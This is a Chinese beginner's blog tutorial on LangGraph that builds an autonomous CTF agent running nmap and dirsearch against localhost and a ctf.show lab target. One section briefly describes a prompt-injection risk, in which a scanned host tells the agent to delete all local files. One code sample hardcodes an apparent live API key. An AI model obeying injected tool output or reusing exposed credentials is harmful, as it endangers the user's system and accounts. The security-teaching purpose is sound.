# 基于LangGraph的自主网络攻防（CTF）智能体

## 前言

```
这几天用了豆包过后，豆包真的给我眼前一亮的感觉，不是因为它用了多么多么强大的LLM，前几年也用过豆包这个ai的chat模型，给我一个感觉：蠢。但最近我为什么有认为它可能是在未来几年可以强势出圈的ai呢，它在高级问题上确实不如现在的gemini这类ai主流模型，但ai最终的落地还是要在普通用户中，不管你gemini在高等数学上刷分有多厉害，一个普通人在面对gemini和豆包的时候，是感觉不出有很大区别的，但当他用完过后，你问他哪个ai更牛逼，他肯定会毫不犹豫的回答你：豆包。为什么呢？我这几天深入体验了一下豆包，我靠，做的真厉害，可能是出自字节跳动这样一个偏向客户端应用端的企业吧，豆包的生态在现阶段应该是做得最好的，最开始惊艳我的是他的视频对话功能，融入多模态我可以想到，但你把它做成了视频通话，并且对话的流畅度不亚于和一个正常人类对话是不可思议的，没有仔细去了解过他用的是什么多模态的模型，接着惊艳到我的是，我是当天晚上玩了一下这个豆包，在打视频电话的时候，它可以精确到确定我是在床上，我问他你怎么知道，它的回答是：“看到你的枕头和被子以及床后的靠背以及你只露出一个头看出来的”，这么多细节都能在短时间内处理出来，后来惊艳到我的是它竟然兼容了很多地方的方言，那天晚上竟然用纯正的成都话和我在唠家常，还有惊艳之处：它可以确切的知道我的位置和天气情况（这个可能调用了地图和天气的api），这还能想到，但更厉害的是：当时我在偏僻的乡下，他可能是用了搜索引擎，告诉我离我最近的镇子明天是赶集的时候，顺便还给我推荐了几家当地的特产店，最后还告诉我明天可能会下雨，记得带上雨伞。能完完整整完成这整个流程，并且很自然，不知道字节的豆包团队在上面下了多少功夫，以大语言模型为基础，可以在上面无限集成工具和工作流。作为一个死盯算法，算法至上的人，当天晚上我的信念有点被动摇了，哈哈，废话还是不多说了，来学习点干货吧，我也是一步一步到处搜集资料整理来的，所以认知还不是很全方位，学到后面会慢慢完善之前语言不当的地方的
```

**这篇文章更多是一个刚接触LangGraph的小白（也就是我本人）的探索尝试。** 认知还在完善，代码难免有坑，但我希望通过这次实践，把那些抽象的概念变成看得见、摸得着的自动化流程

为了带大家（也带我自己）搞清楚LangGraph到底是怎么玩的，我把整篇文章分成了三个部分：

1. **从零到一拆解基础**：抛开复杂的定义，用最直观的代码讲清什么是**State（状态）**、**Node（节点）** 和**Edge（边）**，快速拼装出第一个聊天机器人
2. **让AI学会使唤工具**：这是 Agent 进化的关键。如何通过 **bind_tools** 给模型加上工具，让它学会根据需求自主查资料、填参数、调用工具
3. **实战：CTF自动化渗透尝试**：这是整篇笔记的重头戏。把agent扔进真实的渗透场景，配合**Nmap**和**Dirsearch**等工具，构建一个能自主分析、自动爆破、甚至能自己去拿Flag的**CTF-Agent**



说实话，之前我是个典型的“算法至上”派。总觉得模型嘛，参数多、跑分高才是硬道理。但最近深度用了几天**豆包**，我这信念有点被动摇了

惊艳到我的倒不是它解题有多快，而是那股子“通人性”的落地感。它能用纯正的成都话跟我摆龙门阵，看一眼摄像头就知道我瘫在床上，甚至能查到乡下明天的赶集信息，顺嘴提醒我出门带伞。这让我突然觉得：**AI的未来，可能不只是看脑子有多大，更要看它能不能熟练地使唤工具，融入到真实的生活流里**

回头看看咱们搞开发，如果只是写几个 `if-else` 或 `for` 循环去调模型，那 AI 充其量也就是个按剧本跳舞的傀儡。一旦遇上复杂的环境，剧本就得写死，AI也就“失控”了。我们需要的是一张能随机应变的“地图”，而不是一段刻板的“死剧本”

不知道现在学LangGraph算不算很晚，在我看来，它是解决AI Agent在复杂场景下“智商掉线”的一个值得尝试的方向，写这篇文章呢，我是从0开始学的，也只学了一些皮毛，大概学了langGrah的核心知识后，就在想咋让llm给网安领域，想到就开整，最终看到的是看它能不能自主思考，自主读取问题，自助解决问题

**最后**，本项目的github地址放在文章末尾了



## langGraph的基础组件

之前也做过调用大模型的项目，我心想不就是简简单单的调用加上提示次工程吗，就用几个if else，for语句就搞定的事情，何必去学一个专门的langGraph呢？

网上的网友这样回答的：我理解LangGraph的核心价值不在于“调用简单”，而在于它解决了AI智能体（Agent）在复杂业务场景下的**“失控”问题**。如果把传统的 AI 开发比作“写剧本”，那 LangGraph 更像是**“画地图”**



我实际学下来就一个感触：之前要反反复复的在函数之间传参数，但langGraph有更简单精确的工程流，一个参数贯通始终start-end，我们要做的就是在start-end中添加自己想实现的各个节点和边，这极大减轻了代码的复杂度，提升了代码的稳定可靠性



废话不多说，来简单介绍一些基础组建吧

先来看看一个完整的工作流代码：

```py
from typing import TypedDict, Annotated

import dotenv
from langchain_openai import ChatOpenAI
from langgraph.graph import START, END
from langgraph.graph import StateGraph
from langgraph.graph.message import add_messages

dotenv.load_dotenv()


class GraphState(TypedDict):
    """图状态数据结构，类型为字典"""
    messages: Annotated[list, add_messages]  # 设置消息列表，并添加归纳函数
    node_name: str

# 修改 llm 定义部分
llm = ChatOpenAI(
    model="deepseek-chat",
    openai_api_key="XXXX",
    openai_api_base="https://api.deepseek.com",
)


def chatbot(state: GraphState) -> GraphState:
    """聊天机器人函数"""
    # 1.获取状态里存储的消息列表数据并传递给LLM
    ai_message = llm.invoke(state["messages"])
    # 2.返回更新/生成的状态
    return {"messages": [ai_message], "node_name": "chatbot"}


# 1.创建状态图，并使用GraphState作为状态数据
graph_builder = StateGraph(GraphState)

# 2.添加节点
graph_builder.add_node("llm", chatbot)

# 3.添加边
graph_builder.add_edge(START, "llm")
graph_builder.add_edge("llm", END)

# 4.编译图为Runnable可运行组件
graph = graph_builder.compile()

# 5.调用图架构应用
print(graph.invoke({"messages": [("human", "你好，你是？")], "node_name": "graph"}))

```

返回：

![image-20260202105048036](https://gitee.com/YGFYUGF7DTFY/typora/raw/master/image-20260202105048036.png)



### State

```py
class GraphState(TypedDict):
    """图状态数据结构，类型为字典"""
    messages: Annotated[list, add_messages]  # 设置消息列表，并添加归纳函数
    node_name: str
```

GraphState类相当于是一个全局状态或者可以理解成一个全局上下文对象

**说白了就是记录信息的字典**

主要作用就是记录我们对LLM下达的一系列命令，贯穿始终
这里的Annotated[list, add_messages]意思是每当节点返回新消息时他会自动追加到消息列表（可以理解成一个暂时记忆的功能）



### LLM

```py
llm = ChatOpenAI(
    model="deepseek-chat",
    openai_api_key="XXXX",
    openai_api_base="https://api.deepseek.com",
)
```

这里什么调用什么模型

会在之后的node中调用



### Node

```py
def chatbot(state: GraphState) -> GraphState:
    """聊天机器人函数"""
    # 1.获取状态里存储的消息列表数据并传递给LLM
    ai_message = llm.invoke(state["messages"])
    # 2.返回更新/生成的状态
    return {"messages": [ai_message], "node_name": "chatbot"}
```

每个Node都是“无状态”的纯函数,它只干一件事：从State拿到数据，处理（调大模型），这里会返回ai_message，注意这里的ai_message只是模型的回答信息，return的也只是模型回答的信息，上面介绍的add_messages会自动将ai_message追加到之前的原始信息中(如下所示)
```
{'messages': [
HumanMessage(content='你好，你是？', additional_kwargs={}, response_metadata={}, id='91e6c8af-c151-453b-8a03-2505c1e62add'),
AIMessage(content='你好！我是DeepSeek，由深度求索公司创造的AI助手！😊\n\n我是一个纯文本模型，虽然不支持多模态识别功能，但我可以帮你处理上传的各种文件，比如图像、txt、pdf、ppt、word、excel文件，并从中读取文字信息进行分析处理。我完全免费使用，拥有128K的上下文长度，还支持联网搜索功能（需要你在Web/App中手动点开联网搜索按键）。\n\n你可以通过官方应用商店下载我的App来使用。我很乐意为你解答问题、协助处理各种任务！有什么我可以帮助你的吗？✨', additional_kwargs={'refusal': None}}
```



### Edge

```py
graph_builder.add_edge(START, "llm")
graph_builder.add_edge("llm", END)
```

可以翻译成边，但我更愿意理解成是路由或者是控制流，上面提到的无状态的node节点，要使用Edge连接起来，串成一个完整的工作
起始和结束为：start和end

<img src="https://gitee.com/YGFYUGF7DTFY/typora/raw/master/image-20260202110944273.png" alt="image-20260202110944273" style="zoom:50%;" />



### Compile

```py
# 4.编译图为Runnable可运行组件
graph = graph_builder.compile()
```

这个就是编译功能

将刚刚构建好的组件编译成一个**可执行的对象（Runnable）**，它会检查你的逻辑是否有环、是否有没连上的孤岛节点



整个看下来是不是很干净，但如果用普通的 `while` 循环写，代码很快就会变成“屎山”
```py
# 普通程序员的写法（逻辑混杂）
while True:
    input = get_user_input()
    res = call_deepseek(input + history)
    if "天气" in res:
        # 嵌套逻辑开始...
```





## 工具调用

先来看完整代码：

```py
import json
from typing import TypedDict, Annotated, Any, Literal

import dotenv
from langchain_community.tools import GoogleSerperRun
from langchain_community.utilities import GoogleSerperAPIWrapper
from langchain_core.messages import ToolMessage
from langchain_core.runnables import RunnableConfig
from pydantic import BaseModel, Field
from langchain_openai import ChatOpenAI
from langgraph.graph import START, END
from langgraph.graph import StateGraph
from langgraph.graph.message import add_messages

dotenv.load_dotenv()


class GoogleSerperArgsSchema(BaseModel):
   query: str = Field(description="执行谷歌搜索的查询语句")


# 1.定义工具与工具列表
google_serper = GoogleSerperRun(
   name="google_serper",
   description=(
       "一个低成本的谷歌搜索API。"
       "当你需要回答有关时事的问题时，可以调用该工具。"
       "该工具的输入是搜索查询语句。"
   ),
   args_schema=GoogleSerperArgsSchema,
   api_wrapper=GoogleSerperAPIWrapper(),
)


class State(TypedDict):
   """图状态数据结构，类型为字典"""
   messages: Annotated[list, add_messages]


tools = [google_serper]
llm = ChatOpenAI(
    model="deepseek-chat",
    openai_api_key="sk-4c60e118b9874e4bb945567863620949",
    openai_api_base="https://api.deepseek.com",
    request_timeout=120,  # 超时设置，避免无限等待
)
llm_with_tools = llm.bind_tools(tools)


def chatbot(state: State, config: RunnableConfig | None = None) -> Any:
   """聊天机器人函数"""
   # 1.获取状态里存储的消息列表数据并传递给LLM
   ai_message = llm_with_tools.invoke(state["messages"])
   # 2.返回更新/生成的状态
   return {"messages": [ai_message]}


def tool_executor(state: State, config: RunnableConfig | None = None) -> Any:
   """工具调用执行节点"""
   # 1.构建工具名字映射字典
   tools_by_name = {tool.name: tool for tool in tools}

   # 2.提取最后一条消息里的工具调用信息
   tool_calls = state["messages"][-1].tool_calls

   # 3.循环遍历执行工具
   messages = []
   for tool_call in tool_calls:
       # 4.获取需要执行的工具
       tool = tools_by_name[tool_call["name"]]
       # 5.执行工具并将工具结果添加到消息列表中
       messages.append(ToolMessage(
           tool_call_id=tool_call["id"],
           content=json.dumps(tool.invoke(tool_call["args"])),
           name=tool_call["name"]
       ))

   # 6.返回更新的状态信息
   return {"messages": messages}


def route(state: State, config: RunnableConfig | None = None) -> Literal["tool_executor", "__end__"]:
   """动态选择工具执行亦或者结束"""
   # 1.获取生成的最后一条消息
   ai_message = state["messages"][-1]
   # 2.检测消息是否存在tool_calls参数，如果是则执行`工具路由`
   if hasattr(ai_message, "tool_calls") and len(ai_message.tool_calls) > 0:
       return "tool_executor"
   # 3.否则生成的内容是文本信息，则跳转到结束路由
   return END


# 1.创建状态图，并使用GraphState作为状态数据
graph_builder = StateGraph(State)

# 2.添加节点
graph_builder.add_node("llm", chatbot)
graph_builder.add_node("tool_executor", tool_executor)

# 3.添加边
graph_builder.add_edge(START, "llm")
graph_builder.add_edge("tool_executor", "llm")
graph_builder.add_conditional_edges("llm", route)

# 4.编译图为Runnable可运行组件
graph = graph_builder.compile()

# 5.调用图架构应用
print("开始执行...")
state = graph.invoke(
    {"messages": [("human", "现在的黄金和白银价格？")]},
    config={"recursion_limit": 25},
)

# 只打印最终 AI 回复
for message in reversed(state.get("messages", [])):
    if message.type == "ai" and (not hasattr(message, "tool_calls") or not message.tool_calls):
        print("\n" + "=" * 50)
        print("最终回复：")
        print("=" * 50)
        print(message.content)
        break
```



### 工具定义

```py
class GoogleSerperArgsSchema(BaseModel):
   query: str = Field(description="执行谷歌搜索的查询语句")


# 1.定义工具与工具列表
google_serper = GoogleSerperRun(
   name="google_serper",
   description=(
       "一个低成本的谷歌搜索API。"
       "当你需要回答有关时事的问题时，可以调用该工具。"
       "该工具的输入是搜索查询语句。"
   ),
   args_schema=GoogleSerperArgsSchema,
   api_wrapper=GoogleSerperAPIWrapper(),
)
```

这里是在定义工具，这里定义了一个工具name叫google_serper，描述description是："一个低成本的谷歌搜索API。" "当你需要回答有关时事的问题时，可以调用该工具。""该工具的输入是搜索查询语句。"
这个描述至关重要，决定调用工具，调用什么工具，模型都是自己决定的，那要调用什么工具呢，模型唯一的信息就是这个描述，有了这个描述他才知道，当要去搜索实时信息的时候就要来调用这个工具才行



还有一点十分重要，模型决定调用工具，调用哪个工具是第一步，接下来他要调用工具干嘛，这里的query是需要模型自己填写的

模型想出要搜什么，并把query填进去

例如用户问「2024年北京半程马拉松的前3名成绩是多少」时，模型可能生成：

query="2024北京半程马拉松 前三名 成绩"

或

query="2024年北京半程马拉松 男子组 女子组 前三名"

这些都是模型根据你的问题自动生成的，不是预设或固定的



### 整体流程

还是老问题，这些信息是怎么在整个流程中串起来的，这里使用到的还是state，可以看做一个记录板，把每一条信息都记录下来

上面只介绍了工具，那在整个流程中模型是怎么和这个工具做交互的呢？

一起来理一下这个边：

```py
# 2.添加节点
graph_builder.add_node("llm", chatbot)# 给chatbot命名为llm
graph_builder.add_node("tool_executor", tool_executor)

# 3.添加边，注意并不是按代码顺序执行的哈
graph_builder.add_edge(START, "llm")
graph_builder.add_edge("tool_executor", "llm")
graph_builder.add_conditional_edges("llm", route)
```

**(START, "llm")：**

首先开始，state的内容是：messages = [人类问题]

```py
def chatbot(state: State, config: RunnableConfig | None = None) -> Any:
   """聊天机器人函数"""
   # 1.获取状态里存储的消息列表数据并传递给LLM
   ai_message = llm_with_tools.invoke(state["messages"])
   # 2.返回更新/生成的状态
   return {"messages": [ai_message]}
```

进入chatbot，把 state["messages"] 交给 llm_with_tools.invoke(...)

此时LLM可以看到消息列表和绑定的工具（name、description、args_schema），决定是：直接回答（只返回content），或调用工具（返回 content + tool_calls），模型想调用工具的话就会带上tool_calls



继续往下面看**("llm", route)**

```py
def route(state: State, config: RunnableConfig | None = None) -> Literal["tool_executor", "__end__"]:
   """动态选择工具执行亦或者结束"""
   # 1.获取生成的最后一条消息
   ai_message = state["messages"][-1]
   # 2.检测消息是否存在tool_calls参数，如果是则执行`工具路由`
   if hasattr(ai_message, "tool_calls") and len(ai_message.tool_calls) > 0:
       return "tool_executor"
   # 3.否则生成的内容是文本信息，则跳转到结束路由
   return END
```

注意这里的add_conditional_edges("llm", route)是条件边，意思就是这里会有一个if  else判断语句

这里会查看```state["messages"][-1]```,也就是上一次llm回答的信息，这里route会判断message是否存在tool_calls，如果存在就会返回tool_executor

此时就变成了**("llm","tool_executor")**



接着就会进入tool_executor这个节点

```py
def tool_executor(state: State, config: RunnableConfig | None = None) -> Any:
   """工具调用执行节点"""
   # 1.构建工具名字映射字典
   tools_by_name = {tool.name: tool for tool in tools}

   # 2.提取最后一条消息里的工具调用信息
   tool_calls = state["messages"][-1].tool_calls

   # 3.循环遍历执行工具
   messages = []
   for tool_call in tool_calls:
       # 4.获取需要执行的工具
       tool = tools_by_name[tool_call["name"]]
       # 5.执行工具并将工具结果添加到消息列表中
       messages.append(ToolMessage(
           tool_call_id=tool_call["id"],
           content=json.dumps(tool.invoke(tool_call["args"])),
           name=tool_call["name"]
       ))

   # 6.返回更新的状态信息
   return {"messages": messages}
```

可以看到这个节点实现的就是调用指定工具后，再将工具返回的信息追加在state后面



接着就是边：**("tool_executor", "llm")**

又会进入llm节点

注意这里的llm可以看到state记录板中所有的信息

他始终能看到：用户问题 + 自己之前的回复（含tool_calls）+ 每次工具返回的结果，从而根据完整对话历史决定是继续调用工具（返回的信息是含tool_calls）还是给出最终答案（不含tool_calls）



接着又来到了**("llm", route)**

这里又会进行判断：如果最后的信息含tool_calls就会接着调用工具，如果不含tool_calls，就会返回END，标志流程结束



**讲到最后我相信大家和我也会有同样的疑问，让llm自主去调用工具到底是怎么实现的？**



**库的底层就是在做一个复杂的“填空”和“拼接”游戏。** LangGraph 底层到底在干嘛

所谓的“绑定工具”，其实是在加 Prompt

当你运行`llm.bind_tools(tools)` 时，底层并不是真的把Python函数塞进了模型里，而是把函数的“说明书”转化成了一段特定的 **System Prompt**。

你可以想象底层发给DeepSeek的真实内容（简化版）：

"你是一个助手。你拥有以下工具可用： 工具名：google_serper，描述：一个谷歌搜索API，参数格式：{'query': 'string'}。 **如果用户的问题你需要查资料，请务必输出格式为 <tool_call>{...}</tool_call> 的内容，不要说废话。**"

**模型就是在这种强暗示下，完成了“填空”**

看到的 `tool_calls` 是怎么来的？

DeepSeek这种模型只要看到类似搜索的问题，就预测出一段符合JSON格式的代码块。

**模型输出**：`{"name": "google_serper", "args": {"query": "成都信息工程大学 古域炜"}}`

**库的处理**：LangChain的底层会用**正则表达式**或者特殊的 **Parser（解析器）** 把这段字符串抠出来，封装成我们看到的`tool_calls` 对象



## 示例 langGraph+nmap

这两个相加又会触碰出怎样的火花呢？



### 先来看看结果

我们先来看一下结果

<img src="https://gitee.com/YGFYUGF7DTFY/typora/raw/master/image-20260203113243884.png" alt="image-20260203113243884" style="zoom:50%;" />

这里我事先使用```python -m http.server 80```在本地127.0.0.1:80上开启了一个web服务



我们来梳理一下整个结果是怎么得到的
**首先：**

我们给到agent的命令是：

```
目标为127.0.0.1，请用 nmap 扫描并分析开放端口及服务
```

**接着：**

llm回复到：

```
我将对目标 127.0.0.1 进行端口扫描。首先进行快速扫描，然后根据结果进行更详细的服务探测。
```

注意此时json文件中含有tool_calls

**接着就会进入route节点：**

因为记录板中含有tool_calls，接着就会**进入tool_executor节点**，调用工具nmap,使用 -F -T4 快速扫描常用端口

接着返回nmap扫描到的信息

```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-03 13:53 CST\\nNmap scan report for localhost (127.0.0.1)\\nHost is up (0.000061s latency).\\nNot shown: 97 closed tcp ports (conn-refused)\\nPORT     STATE SERVICE\\n80/tcp   open  http\\n5000/tcp open  upnp\\n8888/tcp open  sun-answerbook\\n\\nNmap done: 1 IP address (1 host up) scanned in 0.02 seconds
```

并追加到记录板



接着llm会阅读整个记录板上的内容，做出决策：
```
现在进行更详细的服务版本探测
```



现在又会使用sV -T4 --top-ports 100调用nmap进行服务版本探测

nmap部分信息（会追加到记录板）为：

```
STATE SERVICE    VERSION\\n80/tcp   open  http       SimpleHTTPServer 0.6 (Python 3.11.7)\\n5000/tcp open  rtsp\\n8888/tcp open  http-proxy tinyproxy 1.11.2\\n1 service unrecognized despite returning data
```



最后llm会阅读整个记录板上的内容，会进行总结分析，给出如下信息：

![image-20260203205551682](https://gitee.com/YGFYUGF7DTFY/typora/raw/master/image-20260203205551682.png)



看完结果，现在来看看我们的代码是如何实现的吧

其实上述代码和之前的代码相差不多，最大的区别在工具这里

```py
@tool
def nmap_scan(target: str, scan_type: str = "quick"):
    """
    使用 nmap 进行端口扫描和服务探测。当需要探测目标主机的开放端口、运行服务或进行初步信息收集时使用。
    target: 目标主机，可以是 IP、域名或 URL（会自动提取主机部分）
    scan_type: 扫描类型。quick=常用端口快速扫描，full=全端口扫描，service=端口+服务版本探测
    """
    host = target.strip()
    if "://" in host:
        host = host.split("://", 1)[1]
    if "/" in host:
        host = host.split("/", 1)[0]
    if ":" in host and not host[0].isdigit():
        host = host.rsplit(":", 1)[0]  # 保留端口前的域名

    scan_opts = {
        "quick": "-F -T4",           # 快速扫描常用端口
        "full": "-p- -T4",           # 全端口扫描
        "service": "-sV -T4 --top-ports 100",  # 服务版本探测
    }
    opts = scan_opts.get(scan_type, scan_opts["quick"])

    try:
        result = subprocess.run(
            ["nmap", *opts.split(), host],
            capture_output=True,
            text=True,
            timeout=120,
        )
        if result.returncode != 0 and result.stderr:
            return f"nmap 执行失败: {result.stderr}"
        return result. ，  
```

可以看到我们可以自定义自己想要的工具

这里我直接使用subprocess.run就可以去调用我本底电脑上安装好的nmap

你可能会发现，这里的描述去哪里了，之前说过一个工具要写一定的描述，不然llm完全不知道这个工具是什么更不可能去调用让他了

```py
# 1.定义工具与工具列表
google_serper = GoogleSerperRun(
   name="google_serper",
   description=(
       "一个低成本的谷歌搜索API。"
       "当你需要回答有关时事的问题时，可以调用该工具。"
       "该工具的输入是搜索查询语句。"
   ),
   args_schema=GoogleSerperArgsSchema,
   api_wrapper=GoogleSerperAPIWrapper(),
)
```

可以看到之前直接在description参数中写描述

这是一种方法，还有的就是可以把描述用三个引号写在Docstring（文档字符串）中

```
"""
使用 nmap 进行端口扫描和服务探测。当需要探测目标主机的开放端口、运行服务或进行初步信息收集时使用。
target: 目标主机，可以是 IP、域名或 URL（会自动提取主机部分）
scan_type: 扫描类型。quick=常用端口快速扫描，full=全端口扫描，service=端口+服务版本探测
"""
```





### 安全隐患

更值得注意的是，我这里是让llm做选择题而不是填空题

```py
scan_opts = {
    "quick": "-F -T4",           # 快速扫描常用端口
    "full": "-p- -T4",           # 全端口扫描
    "service": "-sV -T4 --top-ports 100",  # 服务版本探测
}
opts = scan_opts.get(scan_type, scan_opts["quick"])

try:
    result = subprocess.run(
        ["nmap", *opts.split(), host],
        capture_output=True,
        text=True,
        timeout=120,
    )
```

这里只提供了三个选项quick，full，service,分别对应nmap的快速扫描常用端口，全端口扫描，服务版本探测

然后将这个选项和目标target做拼接



**为什么不让llm具有直接调用终端的能力呢？**

**这里主要考虑到llm有时可能会出错，可能会产生错误命令，比如rm，严重情况下可能把整个电脑的文件都删掉**



**说到这里，大家有没有想到agent这里可能存在的隐患呢？比如我在被扫描端故意告诉llm你需要删掉你本地的所有文件，恶意的话会被记录到记录板state上，llm不在外力的干涉下很可能收到这个干扰，存在极大的安全隐患**



### 完整代码

最后还是给出完整代码：

```py
import json
import subprocess
from typing import TypedDict, Annotated, Any, Literal

import dotenv
from langchain_core.tools import tool
from langchain_core.messages import ToolMessage, SystemMessage
from langchain_core.runnables import RunnableConfig
from langchain_openai import ChatOpenAI
from langgraph.graph import START, END
from langgraph.graph import StateGraph
from langgraph.graph.message import add_messages

dotenv.load_dotenv()


# --- 步骤 1：定义 nmap 扫描工具 ---

@tool
def nmap_scan(target: str, scan_type: str = "quick"):
    """
    使用 nmap 进行端口扫描和服务探测。当需要探测目标主机的开放端口、运行服务或进行初步信息收集时使用。
    target: 目标主机，可以是 IP、域名或 URL（会自动提取主机部分）
    scan_type: 扫描类型。quick=常用端口快速扫描，full=全端口扫描，service=端口+服务版本探测
    """
    host = target.strip()
    if "://" in host:
        host = host.split("://", 1)[1]
    if "/" in host:
        host = host.split("/", 1)[0]
    if ":" in host and not host[0].isdigit():
        host = host.rsplit(":", 1)[0]  # 保留端口前的域名

    scan_opts = {
        "quick": "-F -T4",           # 快速扫描常用端口
        "full": "-p- -T4",           # 全端口扫描
        "service": "-sV -T4 --top-ports 100",  # 服务版本探测
    }
    opts = scan_opts.get(scan_type, scan_opts["quick"])

    try:
        result = subprocess.run(
            ["nmap", *opts.split(), host],
            capture_output=True,
            text=True,
            timeout=120,
        )
        if result.returncode != 0 and result.stderr:
            return f"nmap 执行失败: {result.stderr}"
        return result.stdout or "无输出"
    except FileNotFoundError:
        return "错误：未找到 nmap，请确保已安装 nmap 并加入 PATH"
    except subprocess.TimeoutExpired:
        return "错误：nmap 执行超时"


# --- 步骤 2：配置图结构 ---
class State(TypedDict):
    messages: Annotated[list, add_messages]


tools = [nmap_scan]
llm = ChatOpenAI(
    model="deepseek-chat",
    openai_api_key="XXXX",
    openai_api_base="https://api.deepseek.com",
    request_timeout=120,
)
llm_with_tools = llm.bind_tools(tools)


def chatbot(state: State, config: RunnableConfig | None = None) -> Any:
    # 给 AI 一个系统提示，让它进入 CTF 玩家状态
    sys_msg = SystemMessage(
        content="你是一名 CTF 竞赛与渗透测试专家。请分析目标主机/IP/URL，使用 nmap_scan 工具进行端口扫描和服务探测，并根据扫描结果给出分析与建议。可多次调用工具（如先用 quick 快速扫描，再用 service 探测版本）。")
    # 将系统提示和历史消息组合
    messages = [sys_msg] + state["messages"]
    ai_message = llm_with_tools.invoke(messages)
    return {"messages": [ai_message]}


def tool_executor(state: State, config: RunnableConfig | None = None) -> Any:
    tools_by_name = {tool.name: tool for tool in tools}
    tool_calls = state["messages"][-1].tool_calls
    messages = []
    for tool_call in tool_calls:
        print(f"--- 正在执行工具: {tool_call['name']} 参数: {tool_call['args']} ---")
        tool = tools_by_name[tool_call["name"]]
        content = tool.invoke(tool_call["args"])
        messages.append(ToolMessage(tool_call_id=tool_call["id"], content=json.dumps(content), name=tool_call["name"]))
    return {"messages": messages}


def route(state: State, config: RunnableConfig | None = None) -> Literal["tool_executor", "__end__"]:
    ai_message = state["messages"][-1]
    if hasattr(ai_message, "tool_calls") and len(ai_message.tool_calls) > 0:
        return "tool_executor"
    return END


# --- 步骤 3：构建与运行 ---
graph_builder = StateGraph(State)
graph_builder.add_node("llm", chatbot)
graph_builder.add_node("tool_executor", tool_executor)
graph_builder.add_edge(START, "llm")
graph_builder.add_edge("tool_executor", "llm")
graph_builder.add_conditional_edges("llm", route)
graph = graph_builder.compile()

print("Agent 启动，进入 CTF 渗透模式...")
target = "127.0.0.1"  # 可改为目标 IP、域名或 URL
state = graph.invoke(
    {"messages": [("human", f"目标为 {target}，请用 nmap 扫描并分析开放端口及服务。")]},
    config={"recursion_limit": 10},
)

# 打印完整 messages 列表
print("\n" + "=" * 50)
print("完整 messages：")
print("=" * 50)
print(state.get("messages", []))

print("\n" + "=" * 20 + " 渗透日志 " + "=" * 20)
for message in state["messages"]:
    role = "AI" if message.type == "ai" else ("TOOL" if message.type == "tool" else "User")
    content = message.content if hasattr(message, "content") else str(message)
    print(f"[{role}]: {content}")
```



## agnet+工具 自动渗透

### 前言

agent说白了就是llm+工具，现在我们已经学习了langGraph整个框架，现在的目标就是给agent加上称手好用的工具，因为我也是从0开发的，所以这里给到ctfshow靶场，就将agent作为一个ctf玩家，他的目的就是把所有的web类型的题全部通关，我们现在要做的就是在每遇上一个问题时，就升级我们的agent和工具，这样整个web题做下来，我们的工具开发得也差不多啦，最终得到一个自动化调用工具来解决ctf题的agent，这里就叫CTFAGENT吧，哈哈



老规矩，先给出最开始的代码，我们一步一步进行完善
```py
import json
import os
from typing import TypedDict, Annotated, Any, Literal

import dotenv
from langchain_core.messages import ToolMessage, SystemMessage
from langchain_core.runnables import RunnableConfig
from langchain_openai import ChatOpenAI
from langgraph.graph import START, END
from langgraph.graph import StateGraph
from langgraph.graph.message import add_messages

from tools import nmap_scan, dirsearch_scan, read_web_file, MAX_TOOL_RESULT_CHARS

dotenv.load_dotenv()

# Agent 最多执行多少轮「LLM -> 工具 -> LLM」，防止无限循环
MAX_TOOL_ROUNDS = 20


# --- 步骤 1：图状态与节点 ---

class State(TypedDict):
    messages: Annotated[list, add_messages]


tools = [nmap_scan, dirsearch_scan, read_web_file]
llm = ChatOpenAI(
    model="deepseek-chat",
    # 推荐：使用环境变量传入 API Key，而不是写死在代码里
    openai_api_key=os.getenv("DEEPSEEK_API_KEY", ""),
    openai_api_base="https://api.deepseek.com",
    request_timeout=120,
)
llm_with_tools = llm.bind_tools(tools)


def chatbot(state: State, config: RunnableConfig | None = None) -> Any:
    # 给 AI 一个系统提示，让它进入 CTF 玩家状态
    sys_msg = SystemMessage(
        content=(
            "你是一名 CTF 竞赛与渗透测试专家。"
            "可使用 nmap_scan 做端口扫描（scan_type: quick/full/service）；"
            "使用 dirsearch_scan 做 Web 目录/文件扫描（仅需传 target_url）；"
            "使用 read_web_file 读取指定 URL 的页面/文件内容（dirsearch 发现感兴趣路径后可用此工具获取 Flag 或线索）。"
            "重要：当你已获得足够信息、找到 Flag、或已尝试主要敏感路径仍无新发现时，请直接给出最终结论和总结，不要再调用工具。"
        ),
    )
    # 将系统提示和历史消息组合
    messages = [sys_msg] + state["messages"]
    ai_message = llm_with_tools.invoke(messages)
    return {"messages": [ai_message]}


def tool_executor(state: State, config: RunnableConfig | None = None) -> Any:
    tools_by_name = {tool.name: tool for tool in tools}
    tool_calls = state["messages"][-1].tool_calls
    messages = []
    for tool_call in tool_calls:
        print(f"---- 正在执行工具: {tool_call['name']} 参数: {tool_call['args']} ---")
        tool = tools_by_name[tool_call["name"]]
        content = tool.invoke(tool_call["args"])
        if isinstance(content, str) and len(content) > MAX_TOOL_RESULT_CHARS:
            content = content[:MAX_TOOL_RESULT_CHARS] + "\n\n...(结果已截断，超出上下文限制)"
        messages.append(ToolMessage(tool_call_id=tool_call["id"], content=json.dumps(content), name=tool_call["name"]))
    return {"messages": messages}


def route(state: State, config: RunnableConfig | None = None) -> Literal["tool_executor", "__end__"]:
    ai_message = state["messages"][-1]
    if hasattr(ai_message, "tool_calls") and len(ai_message.tool_calls) > 0:
        return "tool_executor"
    return END


# --- 步骤 3：构建与运行 ---

def main() -> None:
    """简单的命令行入口，演示如何运行整个 Agent。"""
    graph_builder = StateGraph(State)
    graph_builder.add_node("llm", chatbot)
    graph_builder.add_node("tool_executor", tool_executor)
    graph_builder.add_edge(START, "llm")
    graph_builder.add_edge("tool_executor", "llm")
    graph_builder.add_conditional_edges("llm", route)
    graph = graph_builder.compile()

    print("Agent 启动，进入 CTF 渗透模式...")
    target = "http://86101e6c-1732-4dc9-a62a-4bb081ccb6e1.challenge.ctf.show/"  # 可改为目标 IP、域名或 URL
    state = graph.invoke(
        {"messages": [("human", f"目标为 {target}，请用使用现有的工具扫描并分析开放端口及服务，检查是否存在文件泄漏,最终目标是拿到flag")]},
        config={"recursion_limit": 30},
    )

    # 打印完整 messages 列表
    print("\n" + "=" * 50)
    print("完整 messages：")
    print("=" * 50)
    print(state.get("messages", []))

    print("\n" + "=" * 20 + " 渗透日志 " + "=" * 20)
    for message in state["messages"]:
        role = "AI" if message.type == "ai" else ("TOOL" if message.type == "tool" else "User")
        content = message.content if hasattr(message, "content") else str(message)
        print(f"[{role}]: {content}")


if __name__ == "__main__":
    main()
```

工具的话这里专门用一个目录放置，先不给出

